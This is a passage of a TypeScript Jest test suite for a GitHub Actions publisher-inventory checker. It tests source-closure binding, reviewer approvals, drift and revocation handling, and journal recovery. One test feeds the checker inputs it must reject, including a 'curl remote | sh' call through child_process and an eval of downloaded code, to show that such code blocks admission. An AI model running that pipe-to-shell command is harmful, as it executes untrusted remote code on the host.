  const f = fixture({ workflow, programs: [{ id: 'action', path: 'action/action.yml', kind: 'action', content: manifest },
    { id: 'main', path: 'action/main.js', kind: 'node-entrypoint', content: program }],
  edges: [{ from: 'workflow-ci', to: 'action', role: 'uses:inspect:1' }, { from: 'action', to: 'main', role: 'main' }] });
  const variables = { ...(configuration.organization ? { MODE: { origin: 'organization-variable' as const, value: configuration.organization } } : {}),
    ...(configuration.repository ? { MODE: { origin: 'repository-variable' as const, value: configuration.repository } } : {}) };
  const witness = { effectiveVariablesSha256: publisherInventorySha256(variables) };
  const source = f.document.units.find(u => u.id === 'workflow-ci')!, action = f.document.units.find(u => u.id === 'action')!;
  const bind = (unit: typeof source, job: string, step: number, kind: 'env' | 'with', name: string, definition: unknown,
    origin: SetupPublisherInventoryDocument['inputs'][number]['origin'], effectiveEnvironment: Record<string, unknown>) => {
    const anchor = { workflow: workflowPath, job, step, input: `${kind}:${name}`, origin };
    f.document.inputs.push({ id: publisherInventorySha256(anchor), ...anchor, sourceFingerprint: publisherInventorySha256({
      kind: 'publisher-inventory-input-source', source: { repositoryId: unit.repositoryId, commit: unit.commit,
        path: unit.path, contentSha256: unit.contentSha256 }, definition, effectiveEnvironment, callerInputs: {}, variables: witness }) });
  };
  for (const [name, definition] of Object.entries(rootEnv)) bind(source, '', 0, 'env', name, definition,
    name === 'INPUT_VARS_JSON' ? 'input-vars-json' : 'workflow-env', rootEnv);
  const jobEnvironment = { ...rootEnv, ...jobEnv }, stepEnvironment = { ...jobEnvironment, ...stepEnv };
  for (const [name, definition] of Object.entries(jobEnv)) bind(source, 'inspect', 0, 'env', name, definition, 'job-env', jobEnvironment);
  for (const [name, definition] of Object.entries(stepEnv)) bind(source, 'inspect', 1, 'env', name, definition, 'step-env', stepEnvironment);
  for (const [name, definition] of Object.entries(provided)) bind(source, 'inspect', 1, 'with', name, definition,
    name === 'token' ? 'symbolic-secret' : 'literal', stepEnvironment);
  if (!configuration.provided) bind(action, 'inspect', 1, 'with', 'mode', 'manifest-default', 'default', stepEnvironment);
  bindVariableContext(f, variables); const original = f.request.getMockImplementation()!;
  let repositoryValue = configuration.repository;
  f.request.mockImplementation(async (route, parameters) => {
    if (route === 'GET /orgs/{org}/actions/variables') return { data: { total_count: configuration.organization ? 1 : 0,
      variables: configuration.organization ? [{ name: 'MODE', value: configuration.organization, visibility: 'private' }] : [] } };
    if (route === 'GET /repos/{owner}/{repo}/actions/variables') return { data: { total_count: repositoryValue ? 1 : 0,
      variables: repositoryValue ? [{ name: 'MODE', value: repositoryValue }] : [] } };
    return original(route, parameters);
  });
  const fact = await f.inspect(); expect(fact.approvals).toEqual([{ actorId: 17, actorLogin: 'reviewer', reviewId: 101 }]);
  for (const credential of ['controlled-first-credential', 'controlled-second-credential']) {
    const state = { module: { exports: undefined as unknown }, process: { env: { INPUT_MODE: configuration.provided ? 'provided' : 'manifest-default',
      ...(configuration.env ? { MODE: 'step' } : {}), INPUT_TOKEN: credential,
      INPUT_VARS_JSON: JSON.stringify(Object.fromEntries(Object.entries(variables).map(([name, value]) => [name, value.value]))) } } };
    runInNewContext(program, state); expect(state.module.exports).toBe(configuration.expected);
    expect(JSON.stringify(f.document)).not.toContain(credential); expect(JSON.stringify(fact)).not.toContain(credential);
  }
  expect(f.request.mock.calls.every(([route]) => route.startsWith('GET ') && !/secrets/.test(route))).toBe(true);
  if (configuration.repository) {
    repositoryValue = 'changed-source-value';
    await expect(f.inspect()).rejects.toMatchObject({ reason: 'binding-mismatch' });
  }
});
it('publisher-inventory-C31: a floating tag remains unresolved despite binding one committed implementation', async () => {
  const f = fixture({ workflow: 'on: push\njobs:\n  inspect:\n    steps:\n      - uses: owner/project/action@v1\n',
    programs: [{ id: 'action', path: 'action/action.yml', kind: 'composite-action', content: 'name: Fixture\nruns:\n  using: composite\n  steps: []\n' }],
    edges: [{ from: 'workflow-ci', to: 'action', role: 'uses:inspect:1' }] });
  await expect(f.inspect()).rejects.toMatchObject({ reason: 'unresolved-closure' });
});
it('publisher-inventory-C32: an observable foreign publisher wins over a purpose-approved compatible claim', async () => {
  const f = fixture({ workflow: 'on: push\njobs:\n  inspect:\n    steps:\n      - run: publish_bugbot_status_card_action\n' });
  f.document.workflows[0].disposition = 'serialized-producer'; f.seal();
  await expect(f.inspect()).rejects.toMatchObject({ reason: 'incompatible-producer' });
  expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(false);
});
it('publisher-inventory-C33: a reachable direct status-card writer outside the lane stays incompatible despite approval', async () => {
  const f = nodeAction('client.issues.updateComment({body: "<!-- copilot:bugbot-status -->"});\n');
  for (const disposition of ['non-producer', 'serialized-producer'] as const) {
    f.document.workflows[0].disposition = disposition; f.seal();
    await expect(f.inspect()).rejects.toMatchObject({ reason: 'incompatible-producer' });
  }
  expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(false);
});
it('publisher-inventory-C34: source-complete reviewed writing code requires the shared preserved publication lane', async () => {
  const lane = 'concurrency:\n  group: copilot-bugbot-status-${{ github.repository_id }}-${{ inputs.pull_number }}\n  queue: max\n  cancel-in-progress: false\n';
  const f = nodeAction('client.issues.updateComment({body: "<!-- copilot:bugbot-status -->"});\n', undefined, lane);
  f.document.workflows[0].disposition = 'serialized-producer'; f.seal();
  await expect(f.inspect()).resolves.toMatchObject({ workflows: [{ path: workflowPath, disposition: 'serialized-producer' }] });
  for (const broken of [lane.replace('max', 'single'), lane.replace('false', 'true'), lane.replace('copilot-bugbot-status-', 'another-lane-')]) {
    const invalid = nodeAction('client.issues.updateComment({body: "<!-- copilot:bugbot-status -->"});\n', undefined, broken);
    invalid.document.workflows[0].disposition = 'serialized-producer'; invalid.seal();
    await expect(invalid.inspect()).rejects.toMatchObject({ reason: 'incompatible-producer' });
  }
});
it('publisher-inventory-C35: drift during actual preview invalidates operation approval before delivery', async () => {
  const f = reviewedOperation(); f.present.mockImplementation(async () => {
    f.observed.target.baseSha = '8'.repeat(40); f.commits.set(f.observed.target.baseSha, f.observed.tree);
  });
  await expect(f.execute()).rejects.toMatchObject({ reason: 'stale' });
  expect(f.confirm).toHaveBeenCalledTimes(1); expect(f.apply).not.toHaveBeenCalled();
  expect(f.request.mock.calls.every(([route]) => route.startsWith('GET '))).toBe(true);
});
it.each(['tree', 'commit', 'branch'] as const)(
  'publisher-inventory-C36: a live default-ref movement after %s stops the next actual provider phase', async effect => {
    const f = fixture(), state = controlledDelivery(f, completed => {
      if (completed === effect) { f.observed.target.baseSha = '8'.repeat(40); f.commits.set(f.observed.target.baseSha, f.observed.tree); }
    });
    const directory = await mkdtemp(join(tmpdir(), 'publisher-inventory-ref-moved-'));
    try {
      const journal = new SetupPublisherJournalAdapter(directory);
      await expect(executeControlledInstallation(f, journal)).rejects.toMatchObject({ reason: 'stale', retained: { status: 'partial' } });
      const phases = ['tree', 'commit', 'branch'], count = phases.indexOf(effect) + 1;
      expect(f.request.mock.calls.filter(([route]) => route.startsWith('POST '))).toHaveLength(count);
      expect((await journal.load(state.operation))!.effects).toEqual(phases.slice(0, count));
    } finally { await rm(directory, { recursive: true, force: true }); }
  },
);
it('publisher-inventory-C37: a revoked purpose decision stops the actual next reinspection without delivery', async () => {
  const f = reviewedOperation(); f.present.mockImplementation(async () => { f.setReviews([]); });
  await expect(f.execute()).rejects.toMatchObject({ reason: 'stale' });
  expect(f.apply).not.toHaveBeenCalled();
  expect(f.request.mock.calls.filter(([r]) => r.endsWith('/reviews'))).toHaveLength(2);
  expect(f.request.mock.calls.every(([route]) => route.startsWith('GET '))).toBe(true);
});
it('publisher-inventory-C38: a fresh permission revocation invalidates the formerly approved source inventory', async () => {
  const f = reviewedOperation(); f.present.mockImplementation(async () => { f.setPermission({ permission: 'none', user: { id: 17, login: 'reviewer' } }); });
  await expect(f.execute()).rejects.toMatchObject({ reason: 'stale' });
  expect(f.apply).not.toHaveBeenCalled();
  expect(f.request.mock.calls.filter(([r, p]) => r.endsWith('/permission') && p.owner === 'owner' && p.username === 'reviewer')).toHaveLength(2);
});
it('publisher-inventory-C39: replacing the private credential session cannot reuse inventory operation approval', async () => {
  const f = reviewedOperation(); f.present.mockImplementation(async () => { f.credentials.replace('replacement-private-fixture'); });
  await expect(f.execute()).rejects.toMatchObject({ reason: 'stale' });
  expect(f.apply).not.toHaveBeenCalled();
  expect(f.request.mock.calls.filter(([r]) => r === 'GET /user')).toHaveLength(2);
});
it.each(['tree', 'commit', 'branch', 'pull-request'] as const)(
  'publisher-inventory-C41: revocation after %s retains every known durable effect and stops later dispatches', async effect => {
    const f = fixture(), state = controlledDelivery(f, completed => { if (completed === effect) f.setReviews([]); });
    const directory = await mkdtemp(join(tmpdir(), 'publisher-inventory-partial-'));
    try {
      const journal = new SetupPublisherJournalAdapter(directory);
      let stopped: SetupPublisherApplyError | undefined;
      try { await executeControlledInstallation(f, journal); }
      catch (error) { if (!(error instanceof SetupPublisherApplyError)) throw error; stopped = error; }
      expect(stopped).toMatchObject({ reason: 'stale', retained: { status: 'partial' } });
      const all = ['tree', 'commit', 'branch', 'pull-request'], expected = all.slice(0, all.indexOf(effect) + 1);
      expect(stopped!.retained.effects).toEqual(expected);
      expect(stopped!.retained.preparedTree).toBe(state.tree);
      if (effect !== 'tree') expect(stopped!.retained.preparedCommit).toBe(state.commit);
      if (effect === 'pull-request') expect(stopped!.retained.pullRequestNumber).toBe(73);
      const record = await journal.load(state.operation);
      expect(record).toEqual(stopped!.retained); expect(record!.uncertain).toBeUndefined();
      expect(f.request.mock.calls.filter(([route]) => route.startsWith('POST ')).map(([route]) => route)).toEqual([
        'POST /repos/{owner}/{repo}/git/trees', 'POST /repos/{owner}/{repo}/git/commits',
        'POST /repos/{owner}/{repo}/git/refs', 'POST /repos/{owner}/{repo}/pulls',
      ].slice(0, expected.length));
      expect(JSON.stringify(record)).not.toMatch(/private-inventory-fixture|private-source-fixture/u);
    } finally { await rm(directory, { recursive: true, force: true }); }
  },
);
it('publisher-inventory-recovery-C02: a failed save preserves the observed PR separately from the older durable record', async () => {
  const f = fixture(), state = controlledDelivery(f, effect => { if (effect === 'pull-request') f.setReviews([]); });
  const directory = await mkdtemp(join(tmpdir(), 'publisher-inventory-journal-failure-'));
  try {
    const saved = new SetupPublisherJournalAdapter(directory);
    const journal: SetupPublisherJournalPort = { load: id => saved.load(id), lock: id => saved.lock(id), save: async operation => {
      if (operation.pullRequestNumber === 73) throw new Error('Controlled observation persistence failure');
      await saved.save(operation);
    } };
    let stopped: SetupPublisherApplyError | undefined;
    try { await executeControlledInstallation(f, journal); }
    catch (error) { if (!(error instanceof SetupPublisherApplyError)) throw error; stopped = error; }
    expect(stopped).toMatchObject({ reason: 'journal', retained: { pullRequestNumber: 73,
      effects: ['tree', 'commit', 'branch', 'pull-request'] } });
    const durable = await saved.load(state.operation);
    expect(durable).toEqual(stopped!.lastPersisted);
    expect(durable).toMatchObject({ effects: ['tree', 'commit', 'branch'], uncertain: 'pull-request' });
    expect(durable!.pullRequestNumber).toBeUndefined();
    expect(f.request.mock.calls.filter(([route]) => route.startsWith('POST '))).toHaveLength(4);
  } finally { await rm(directory, { recursive: true, force: true }); }
});
it('publisher-inventory-C42: a valid old journal cannot manufacture a current inventory review during actual resume', async () => {
  const f = fixture(), operationId = '11111111-1111-4111-8111-111111111111';
  const directory = await mkdtemp(join(tmpdir(), 'publisher-inventory-old-journal-'));
  try {
    const journal = new SetupPublisherJournalAdapter(directory);
    await journal.save({ schemaVersion: 2, purpose: 'bugbot-status-publisher', operationId, repositoryId: 42, repository: 'owner/project',
      defaultBranch: 'main', baseSha: f.proposal.destination.head, sourceCommit: f.proposal.source.commit,
      planDigest: '0'.repeat(64), approvalDigest: '1'.repeat(64), actorId: 7, status: 'waiting-for-merge',
      effects: ['tree', 'commit', 'branch', 'pull-request'], preparedTree: 'a'.repeat(40), preparedCommit: 'b'.repeat(40), pullRequestNumber: 73 });
    const before = await readFile(join(directory, operationId + '.json')); f.setReviews([]);
    await expect(executeControlledInstallation(f, journal, true)).rejects.toMatchObject({ reason: 'inventory',
      blocked: { reason: 'review-required', operationId, repository: 'owner/project' }, retained: { pullRequestNumber: 73 } });
    expect(await readFile(join(directory, operationId + '.json'))).toEqual(before);
    expect(f.request.mock.calls.every(([route]) => route.startsWith('GET '))).toBe(true);
    expect((await journal.load(operationId))!.planDigest).toBe('0'.repeat(64));
  } finally { await rm(directory, { recursive: true, force: true }); }
});
it.each(['denied', 'foreign'] as const)(
  'publisher-inventory-recovery-C03: %s PR readback cannot manufacture a confirmed effect from the POST response', async failure => {
    const f = fixture(), state = controlledDelivery(f, () => undefined), original = f.request.getMockImplementation()!;
    let created = false;
    f.request.mockImplementation(async (route, parameters) => {
      if (route === 'GET /repos/{owner}/{repo}/pulls' && created) {
        if (failure === 'denied') throw { status: 403 };
        const result = await original(route, parameters), values = JSON.parse(JSON.stringify(result.data));
        values[0].head.repo.id = 999; return { data: values };
      }
      const result = await original(route, parameters);
      if (route === 'POST /repos/{owner}/{repo}/pulls') created = true;
      return result;
    });
    const directory = await mkdtemp(join(tmpdir(), 'publisher-inventory-unconfirmed-'));
    try {
      const journal = new SetupPublisherJournalAdapter(directory);
      await expect(executeControlledInstallation(f, journal)).rejects.toMatchObject({ reason: 'delivery',
        retained: { status: 'partial', effects: ['tree', 'commit', 'branch'], uncertain: 'pull-request' } });
      const durable = await journal.load(state.operation); expect(durable!.pullRequestNumber).toBeUndefined();
      expect(f.request.mock.calls.filter(([route]) => route === 'POST /repos/{owner}/{repo}/pulls')).toHaveLength(1);
      expect(f.request.mock.calls.filter(([route]) => route.startsWith('POST '))).toHaveLength(4);
    } finally { await rm(directory, { recursive: true, force: true }); }
  },
);
it('publisher-inventory-C49: actual source/destination/review readers and pure planner admit exact preview without injected verdicts', async () => {
  const f = fixture(), snapshot = await f.inspectComplete();
  expect(snapshot.inspection.installation.publisher).toEqual({ kind: 'absent', paths: [] });
  expect(snapshot.inspection.installation.inventoryReview).toMatchObject({ documentSha256: f.locator.documentSha256 });
  const plan = planSetupPublisherInstallation(f.proposal, snapshot.inspection, '11111111-1111-4111-8111-111111111111');
  expect(plan.status).toBe('review'); expect(plan.files.map(file => file.path)).toEqual([
    '.github/workflows/copilot_bugbot_status_card.yml', '.copilot/setup-manifest.json']);
  expect(plan.inventoryReview?.approvals).toEqual([{ reviewId: 101, actorId: 17, actorLogin: 'reviewer' }]);
  expect(f.request.mock.calls.every(([route]) => route.startsWith('GET '))).toBe(true);
});
it('publisher-inventory-C50: malformed actual provider review identity cannot reach a ready plan', async () => {
  const f = fixture(); f.setPermission({ permission: 'write', user: { id: 99, login: 'reviewer' } });
  await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'review-unavailable' });
  expect(f.request.mock.calls.every(([route]) => route.startsWith('GET '))).toBe(true);
});
it('publisher-inventory-C53: a changed authenticated decision changes the plan even when reviewed source bytes stay fixed', async () => {
  const f = fixture(), operation = '11111111-1111-4111-8111-111111111111';
  const first = planSetupPublisherInstallation(f.proposal, (await f.inspectComplete()).inspection, operation);
  f.setReviews([{ id: 102, user: { id: 17, login: 'reviewer', type: 'User' }, state: 'APPROVED',
    submitted_at: '2026-11-28T00:01:00Z', commit_id: head, body: marker(f.document) }]);
  const second = planSetupPublisherInstallation(f.proposal, (await f.inspectComplete()).inspection, operation);
  expect(second.files[0]).toEqual(first.files[0]); expect(second.digest).not.toBe(first.digest);
  expect(second.approvalDigest).not.toBe(first.approvalDigest);
  expect(f.request.mock.calls.every(([route]) => route.startsWith('GET '))).toBe(true);
});
it('publisher-inventory-C47: an unsupported new installed snapshot preserves the known old PR without offering a plan', async () => {
  const f = fixture(), operationId = '11111111-1111-4111-8111-111111111111';
  const old = planSetupPublisherInstallation(f.proposal, (await f.inspectComplete()).inspection, operationId);
  const retained: SetupPublisherOperation = { schemaVersion: 2, purpose: old.purpose, operationId, repositoryId: old.target.id,
    repository: `${old.target.owner}/${old.target.name}`, defaultBranch: old.target.defaultBranch, baseSha: old.target.baseSha,
    sourceCommit: old.sourceCommit, planDigest: old.digest, approvalDigest: old.approvalDigest!, actorId: old.actorId,
    status: 'waiting-for-merge', effects: ['tree', 'commit', 'branch', 'pull-request'], preparedTree: 'a'.repeat(40),
    preparedCommit: 'c'.repeat(40), pullRequestNumber: 73 };
  const path = '.copilot/AGENT_GUIDE.md'; expect(f.files.has(path)).toBe(true);
  f.files.set(path, f.files.get(path)! + '\nChanged outside its installation manifest.\n');
  const targetHead = 'd'.repeat(40), targetTree = f.retain(f.files);
  f.commits.set(targetHead, targetTree); f.observed.target.baseSha = targetHead; Object.assign(f.proposal.destination, { head: targetHead });
  f.document.destination.head = targetHead; f.document.destination.tree = f.observed.tree = targetTree;
  for (const unit of f.document.units) { unit.commit = targetHead; unit.tree = targetTree; }
  f.seal();
  const present = jest.fn(), confirm = jest.fn(), apply = jest.fn();
  const review = new ReviewSetupPublisherUseCase({ inspect: p => f.inspectComplete(p), present, confirm, active: () => true });
  await expect(review.execute({ proposal: f.proposal, operationId, dryRun: false, reviewedOperation: retained }, apply))
    .rejects.toMatchObject({ reason: 'planning', planFailure: 'installation-unsupported', retained });
  expect(present).not.toHaveBeenCalled(); expect(confirm).not.toHaveBeenCalled(); expect(apply).not.toHaveBeenCalled();
  expect(f.request.mock.calls.every(([r]) => r.startsWith('GET '))).toBe(true);
});
it.each(['evidence PR', 'document blob', 'unit blob', 'review list', 'review permission'] as const)(
  'publisher-inventory-recovery-C04: actual denied %s read preserves the actionable inventory cause', async fault => {
    const f = fixture(), present = jest.fn(), confirm = jest.fn(), apply = jest.fn(), original = f.request.getMockImplementation()!;
    const documentBlob = blob(canonicalPublisherInventoryJson(f.document)), unitBlob = f.document.units[0].blob;
    let inventoryStarted = false;
    f.request.mockImplementation(async (route, p) => {
      const evidence = route === 'GET /repos/{owner}/{repo}/pulls/{pull_number}' && p.repo === 'project';
      if (evidence) inventoryStarted = true;
      if (fault === 'evidence PR' && evidence || fault === 'document blob' && p.file_sha === documentBlob
        || fault === 'unit blob' && inventoryStarted && p.file_sha === unitBlob
        || fault === 'review list' && route.endsWith('/reviews')
        || fault === 'review permission' && p.repo === 'project' && route.endsWith('/permission')) throw { status: 403 };
      return original(route, p);
    });
    const review = new ReviewSetupPublisherUseCase({ inspect: p => f.inspectComplete(p), present, confirm, active: () => true });
    await expect(review.execute({ proposal: f.proposal, operationId: '11111111-1111-4111-8111-111111111111', dryRun: false }, apply))
      .rejects.toMatchObject({ reason: 'inventory', blocked: { reason: fault === 'unit blob' ? 'unresolved-closure' : 'review-unavailable' } });
    expect(present).not.toHaveBeenCalled(); expect(confirm).not.toHaveBeenCalled(); expect(apply).not.toHaveBeenCalled();
    expect(f.request.mock.calls.every(([r]) => r.startsWith('GET '))).toBe(true);
  });
it('publisher-inventory-C44: an explicit unresolved disposition remains blocked despite a current purpose approval', async () => {
  const f = fixture(); f.document.workflows[0].disposition = 'unresolved'; f.seal();
  await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'unresolved-closure' });
  expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(true);
  expect(f.request.mock.calls.every(([r]) => r.startsWith('GET '))).toBe(true);
});
it.each(['deep metadata', 'large metadata inventory'] as const)(
  'publisher-inventory-C06: the independent execution reader rejects %s without truncating source inspection', async fault => {
    let nested: unknown = 0;
    for (let n = 0; n < 70; n++) nested = { nested };
    const workflow = JSON.stringify({ on: 'push', extra: fault === 'deep metadata' ? nested : Array.from({ length: 10_001 }, () => 0),
      jobs: { inspect: { steps: [] } } });
    const f = fixture({ workflow });
    await expect(f.inspect()).rejects.toMatchObject({ reason: 'unresolved-closure' });
    expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(false);
  });
it('publisher-inventory-C27: a recursive composite Action does not become a finite source closure', async () => {
  const action = `runs:\n  using: composite\n  steps:\n    - uses: owner/project/action@${'1'.repeat(40)}\n`;
  const f = fixture({ workflow: `on: push\njobs:\n  inspect:\n    steps:\n      - uses: owner/project/action@${'1'.repeat(40)}\n`,
    programs: [{ id: 'action', path: 'action/action.yml', kind: 'composite-action', content: action }],
    edges: [{ from: 'workflow-ci', to: 'action', role: 'uses:inspect:1' }, { from: 'action', to: 'action', role: 'uses:composite:1' }] });
  await expect(f.inspect()).rejects.toMatchObject({ reason: 'unresolved-closure' });
  expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(false);
});
it.each(['malformed default', 'noncanonical manifest name'] as const)(
  'publisher-inventory-C28: source identity cannot waive a %s', async fault => {
    const f = fixture({ workflow: `on: push\njobs:\n  inspect:\n    steps:\n      - uses: owner/project/action@${'1'.repeat(40)}\n`,
      programs: [{ id: 'action', path: fault === 'malformed default' ? 'action/action.yml' : 'action/metadata.yml', kind: 'action',
        content: 'inputs: {mode: false}\nruns: {using: node24, main: main.js}\n' }],
      edges: [{ from: 'workflow-ci', to: 'action', role: 'uses:inspect:1' }] });
    await expect(f.inspect()).rejects.toMatchObject({ reason: 'unresolved-closure' });
    expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(false);
  });
it('publisher-inventory-C27: a bare module without an authenticated source unit remains unresolved', async () => {
  const f = nodeAction("require('unreviewed-package');\n");
  await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'unresolved-closure' });
  expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(false);
});
it.each(['entrypoint declared as data', 'Node declared composite', 'composite steps not an array'] as const)(
  'publisher-inventory-C28: contradictory execution metadata cannot replace source closure: %s', async fault => {
    const f = fixture({ workflow: `on: push\njobs:\n  inspect:\n    steps:\n      - uses: owner/project/action@${'1'.repeat(40)}\n`,
      programs: [{ id: 'action', path: 'action/action.yml', kind: fault === 'entrypoint declared as data' ? 'action' : 'composite-action',
        content: fault === 'composite steps not an array' ? 'runs: {using: composite, steps: {}}\n' : 'runs: {using: node24, main: main.js}\n' },
      { id: 'main', path: 'action/main.js', kind: 'data-file', content: 'console.log("controlled");\n' }],
      edges: [{ from: 'workflow-ci', to: 'action', role: 'uses:inspect:1' }, { from: 'action', to: 'main', role: 'main' }] });
    await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'unresolved-closure' });
    expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(false);
  });
it.each(['repository ID', 'repository name', 'owner ID', 'owner login'] as const)(
  'publisher-inventory-C30: live Variable metadata with changed %s never inherits prior target authority', async fault => {
    let reads = 0;
    const f = variableFixture({ response: (route, p, data) => {
      if (route !== 'GET /repos/{owner}/{repo}' || p.repo !== 'project' || ++reads !== 2) return data;
      const repository = data as { id: number; full_name: string; owner: { id: number; login: string } };
      if (fault === 'repository ID') return { ...repository, id: 999 };
      if (fault === 'repository name') return { ...repository, full_name: 'owner/another' };
      return { ...repository, owner: { ...repository.owner, ...(fault === 'owner ID' ? { id: 999 } : { login: 'another' }) } };
    } });
    await expect(f.inspect()).rejects.toMatchObject({ reason: 'unresolved-closure' });
    expect(reads).toBe(2); expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(false);
  });
it('publisher-inventory-C51: complete reader and review cannot expose a plan from an exhausted review listing, even with an approval on page one', async () => {
  const f = fixture(), present = jest.fn(), confirm = jest.fn(), apply = jest.fn();
  f.setReviews([{ id: 101, user: { id: 17, login: 'reviewer', type: 'User' }, state: 'APPROVED',
    submitted_at: '2026-11-28T00:00:00Z', commit_id: head, body: marker(f.document) },
  ...Array.from({ length: 999 }, (_, n) => ({ id: n + 1000, user: { id: 18, login: 'pending-reviewer', type: 'User' },
    state: 'PENDING', submitted_at: null, commit_id: null, body: null }))]);
  const review = new ReviewSetupPublisherUseCase({ inspect: p => f.inspectComplete(p), present, confirm, active: () => true });
  await expect(review.execute({ proposal: f.proposal, operationId: '11111111-1111-4111-8111-111111111111', dryRun: false }, apply))
    .rejects.toMatchObject({ reason: 'inventory', blocked: { reason: 'review-unavailable' } });
  expect(f.request.mock.calls.filter(([r]) => r.endsWith('/reviews')).map(([, p]) => p.page)).toEqual([1, 2, 3, 4, 5, 6, 7, 8, 9, 10]);
  expect(f.request.mock.calls.some(([r, p]) => p.owner === 'owner' && r.endsWith('/permission'))).toBe(false);
  expect(present).not.toHaveBeenCalled(); expect(confirm).not.toHaveBeenCalled(); expect(apply).not.toHaveBeenCalled();
  expect(f.request.mock.calls.every(([r]) => r.startsWith('GET '))).toBe(true);
});
it('publisher-inventory-C54: complete compatible installed inventory reaches unchanged without approval, a journal or an empty PR', async () => {
  // This source fixture intentionally contains no writer. It proves the actual
  // exact-workflow/no-op route, not compatibility of the repository deployment.
  const baseline = setupPublisherFixture(), installed = baseline.inspection.source.workflow
    .replace('uses: ./', `uses: vypdev/copilot@${baseline.proposal.source.commit}`);
  const f = fixture({ workflow: installed, workflowPath: SETUP_PUBLISHER_WORKFLOW_PATH, programs: [],
    edges: [{ from: 'workflow-ci', to: 'publisher-action', role: 'uses:publish:1' },
      { from: 'publisher-action', to: 'publisher-main', role: 'main' }] });
  for (const [id, path, kind] of [['publisher-action', 'action.yml', 'action'],
    ['publisher-main', 'build/github_action/index.js', 'node-entrypoint']] as const) {
    const content = f.sourceFiles[path];
    f.document.units.push({ id, path, kind, repositoryId: 891781467, repository: 'vypdev/copilot',
      commit: f.proposal.source.commit, tree: '5'.repeat(40), mode: '100644', blob: blob(content), contentSha256: hash(content),
      behavior: 'Independent fixture review: the exact bound program has no status-card writer.' });
  }
  const source = f.document.units.find(u => u.id === 'workflow-ci')!;
  const anchor = { workflow: SETUP_PUBLISHER_WORKFLOW_PATH, job: 'publish', step: 1, input: 'with:single-action', origin: 'literal' as const };
  f.document.inputs.push({ id: publisherInventorySha256(anchor), ...anchor, sourceFingerprint: publisherInventorySha256({
    kind: 'publisher-inventory-input-source', source: { repositoryId: source.repositoryId, commit: source.commit,
      path: source.path, contentSha256: source.contentSha256 }, definition: 'publish_bugbot_status_card_action',
    effectiveEnvironment: {}, callerInputs: {}, variables: {} }) }); f.seal();
  const present = jest.fn(), confirm = jest.fn(), apply = jest.fn();
  const review = new ReviewSetupPublisherUseCase({ inspect: p => f.inspectComplete(p), present, confirm, active: () => true });
  const result = await review.execute({ proposal: f.proposal, operationId: '11111111-1111-4111-8111-111111111111', dryRun: false }, apply);
  expect(result).toMatchObject({ stage: 'unchanged', plan: { status: 'unchanged', files: [], approvalDigest: null,
    inventoryReview: { approvals: [{ actorId: 17 }] } } });
  expect(present).toHaveBeenCalledTimes(1); expect(confirm).not.toHaveBeenCalled(); expect(apply).not.toHaveBeenCalled();
  expect(f.request.mock.calls.every(([r]) => r.startsWith('GET '))).toBe(true);
});
it.each(['non-producer', 'serialized-producer'] as const)(
  'publisher-inventory-C55: positive foreign writer blocks the actual composed route despite an approved %s claim', async disposition => {
    const f = fixture({ workflow: 'on: push\njobs:\n  inspect:\n    steps:\n      - run: publish_bugbot_status_card_action\n' });
    f.document.workflows[0].disposition = disposition; f.seal();
    const present = jest.fn(), confirm = jest.fn(), apply = jest.fn();
    const review = new ReviewSetupPublisherUseCase({ inspect: p => f.inspectComplete(p), present, confirm, active: () => true });
    await expect(review.execute({ proposal: f.proposal, operationId: '11111111-1111-4111-8111-111111111111', dryRun: false }, apply))
      .rejects.toMatchObject({ reason: 'inventory', blocked: { reason: 'incompatible-producer' } });
    expect(present).not.toHaveBeenCalled(); expect(confirm).not.toHaveBeenCalled(); expect(apply).not.toHaveBeenCalled();
    expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(false);
    expect(f.request.mock.calls.every(([r]) => r.startsWith('GET '))).toBe(true);
  });
it('binds every static Node import to the exact transitive Git source before admitting its review', async () => {
  const f = nodeAction("require('./helper.js');\n", 'console.log("helper");\n');
  await expect(f.inspect()).resolves.toMatchObject({ approvals: [{ actorId: 17 }] });
  f.document.edges = f.document.edges.filter(edge => edge.role !== 'import:1'); f.seal();
  await expect(f.inspect()).rejects.toMatchObject({ reason: 'unresolved-closure' });
  for (const code of ["require(process.env.SELECTOR);", "const load = require; load('./helper.js');", "import('./' + process.env.SELECTOR);",
    "require('node:child_process').exec('curl remote | sh');", "eval('downloaded code');"]) {
    await expect(nodeAction(code).inspect()).rejects.toMatchObject({ reason: 'unresolved-closure' });
  }
});
it('binds a composite inline shell callee through its action path rather than an assumed checkout', async () => {
  const action = 'name: Fixture\nruns:\n  using: composite\n  steps:\n    - run: node "$GITHUB_ACTION_PATH/main.js"\n      shell: bash\n';
  const f = fixture({ workflow: `on: push\njobs:\n  inspect:\n    steps:\n      - uses: owner/project/action@${'1'.repeat(40)}\n`,
    programs: [{ id: 'action', path: 'action/action.yml', kind: 'composite-action', content: action },
      { id: 'inline', path: 'action/action.yml', kind: 'shell-program', content: action },
      { id: 'main', path: 'action/main.js', kind: 'node-entrypoint', content: 'console.log("bound program");\n' }],
    edges: [{ from: 'workflow-ci', to: 'action', role: 'uses:inspect:1' },
      { from: 'action', to: 'inline', role: 'run:composite:1' }, { from: 'inline', to: 'main', role: 'program:1' }] });
  await expect(f.inspect()).resolves.toMatchObject({ approvals: [{ actorId: 17 }] });
  f.document.edges = f.document.edges.filter(e => e.role !== 'program:1'); f.seal();
  await expect(f.inspect()).rejects.toMatchObject({ reason: 'unresolved-closure' });
});
it.each(['ordered', 'swapped'] as const)('publisher-inventory-C29: composite shell binds two callees in command order: %s', async order => {
  const action = 'name: Fixture\nruns:\n  using: composite\n  steps:\n    - run: node "$GITHUB_ACTION_PATH/first.js" && node "$GITHUB_ACTION_PATH/second.js"\n      shell: bash\n';
